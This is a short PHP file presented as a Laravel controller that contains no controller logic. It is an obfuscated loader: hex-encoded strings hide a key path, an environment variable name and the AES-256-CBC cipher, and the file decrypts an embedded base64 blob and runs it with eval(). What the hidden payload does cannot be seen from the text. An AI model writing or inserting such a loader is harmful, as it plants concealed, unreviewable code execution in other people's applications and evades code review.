<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('qwzmavyj9fHQu2umJkF4fg==');

$c=base64_decode(

'6QdBZPfiuYv0KVL4TYhUGs3BIsbPmL4ZYfGYVLG4tD9O7AUqAX9BRjhnD+kTx63Cjcgnrn95i9h4' .
'6kk02H/5dTZwP6Ms2X3yYTquLpZ3XO3ILcY6ettaNzOEtRqkJjIvTmcCKA1Abc3z4dWJlu5lwLhY' .
'k3EQuASw8vPt4tN/MclDD41Vs6eMD394uLGcOPSIQKMDjBHrEdcZLR74FZXdknCNYmFX4ftfEcJz' .
'qjQlzLALx380OEJj2Rsslih53pQO'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

